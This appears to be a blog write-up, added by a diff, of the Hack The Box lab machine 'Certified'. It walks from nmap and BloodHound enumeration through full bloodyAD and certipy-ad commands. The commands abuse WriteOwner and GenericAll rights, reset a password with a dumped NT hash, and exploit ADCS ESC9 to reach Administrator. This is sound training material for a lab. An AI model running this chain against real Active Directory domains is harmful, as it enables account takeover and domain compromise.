@@ -1,0 +1,213 @@
+---
+title: HTB-Certified
+published: 2026-01-24
+toc: true
+draft: false
+tags:
+  - ADCS
+  - ESC9
+  - BloodyAD
+  - BloodHound
+  - enum4linux
+  - WriteOwner
+  - GenericWrite
+  - GenericAll
+---
+
+```
+Scope:
+10.129.231.186
+
+Creds:
+judith.mader 
+judith09
+```
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- --min-rate=5000 -Pn -T5 -vvvv certified.htb
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-01-24 17:38:48Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-24T17:40:17+00:00; +6h59m48s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA/domainComponent=certified
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA/domainComponent=certified
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-24T17:40:17+00:00; +6h59m48s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA/domainComponent=certified
+3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA/domainComponent=certified
+|_ssl-date: 2026-01-24T17:40:17+00:00; +6h59m48s from scanner time.
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49693/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49724/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49745/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+## enum4linux-ng
+
+Using the provided creds I start off by running an enum scan of the target:
+
+![](attachments/b84bc598971f6c4c3e3e8aa73ac38268.png)
+
+![](attachments/ad9290b227f278d6153f5344b63bb4ed.png)
+
+As well as no lockout policy:
+
+![](attachments/bcde0056325ced0f1aab288dd29f87c5.png)
+
+## nxc
+
+I continued my enumeration using `nxc`:
+
+![](attachments/60f5376a7ec911dab7491e81a4df43de.png)
+
+![](attachments/4386d43d8b160d8b82b3b3809045f2c6.png)
+
+![](attachments/fad6029e4f3d1fbd3219d96f0d24d898.png)
+
+I quickly spidered the shares and found nothing useful:
+
+![](attachments/0cb53010053f01d50d329bc4c6bdde9c.png)
+
+## BloodHound
+
+After some thorough enumeration I decided to check out `bloodohund`:
+
+![](attachments/2454275fd5a5e47c7831bb98b8dc8682.png)
+
+![](attachments/a2549ceb15926a1bf3c5106f4f2a7b31.png)
+
+Our user appears to have **WriteOwner** privs over the **MANAGEMENT** group, which will in turn give us access to the *management_svc* user.
+
+# Exploitation
+## WriteOwner on group
+
+This could be simply done using `bloodyAD`:
+
+```bash
+bloodyAD --host 10.129.231.186 -d certified.htb -u 'judith.mader' -p 'judith09' set owner 'MANAGEMENT' 'judith.mader'
+```
+
+![](attachments/c540fa52556849383ad5ec2e3d7aa1a2.png)
+
+## GenericWrite
+
+Next up I had to abuse the **GenericWrite** privs over *management_svc*. In order to do this though I'd have to give myself **GenericAll** privs first over the **MANAGEMENT** group:
+
+```bash
+bloodyAD --host 10.129.231.186 -d certified.htb -u 'judith.mader' -p 'judith09' add genericAll 'MANAGEMENT' 'judith.mader'
+```
+
+![](attachments/f4d8f49ff634dd9e5c2c614177fa0695.png)
+
+Then add myself to the group:
+
+![](attachments/fd1141b29d6ba88d518993baf065490c.png)
+
+Finally I was able to add shadowCredentials to the *management_svc* user:
+
+![](attachments/8c39726330b94df0de47cc132c9f1ca9.png)
+
+## GenericAll
+
+I can now exploit the **GenericAll** privs over *ca_operator*:
+
+![](attachments/aaed8d50b5e23f73d5f5e704f2e6edbb.png)
+
+I will be doing this by using the dumped NT hash:
+
+```bash
+bloodyAD --host 10.129.231.186 -d certified.htb -u 'management_svc' -p ':a091c1832bcdd4677c28b5a6a1295584' set password 'ca_operator' 'P@ssword123!'
+```
+
+![](attachments/e23be6bfb16e6f3fce09e26ab7c84833.png)
+
+# Privilege Escalation
+## ADCS - ESC9
+
+Once I took over the *ca_operator* user it was time to check out the certificates:
+
+![](attachments/49640fe176790570a1b0ec563c513c7f.png)
+
+![](attachments/8f19a4285685d25bddde46837c6db1cd.png)
+
+It turns out that the target is vulnerable to **ESC9**.
+
+In order to exploit this we will be taking the following steps:
+
+```bash
+certipy-ad account -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584  -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'administrator' update
+```
+
+![](attachments/51c9648087bdf6f50132d0c4b1e9ec6a.png)
+
+Next up the TGT is obtained in order to pass the kerb ticket 
+
+```bash
+certipy-ad shadow -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -account 'ca_operator' auto -dc-host dc01.certified.htb
+```
+
+![](attachments/a1ae53646e77f2661ffddde7e1e548cf.png)
+
+![](attachments/d7ed77ed676e51ea41ac0f47d20e5afb.png)
+
+We will now be requesting the certificate:
+
+```bash
+certipy-ad req -k -dc-ip 10.129.231.186 -target DC01.certified.htb -ca certified-DC01-CA -template CertifiedAuthentication
+```
+
+![](attachments/de49c51e3bb9203704730f5e5bd9e818.png)
+
+As part of the clean up we reverse the *ca_operator* rights:
+
+```bash
+certipy-ad account -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584  -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'ca_operator' update
+```
+
+![](attachments/b02ddbcf6ea71a10500a680800130a3a.png)
+
+Lastly we authenticate as the *Administrator*:
+
+![](attachments/1d7c30fb894af7cc314c9d1e56030645.png)
+
+![](attachments/e86844143d83f8f01cbe2e7d9a86dbbf.png)
+
+### user.txt
+
+![](attachments/1ee73c2298911f0d3fde9f96dcdb4124.png)
+
+### root.txt
+
+![](attachments/a07acf54cb0dfaf47f49c2cc19e3efd7.png)
+
+![](attachments/93e017f03cd0723ab87b5838dd746572.png)
+
+---
+
+[^Links]: [[Hack The Box]]
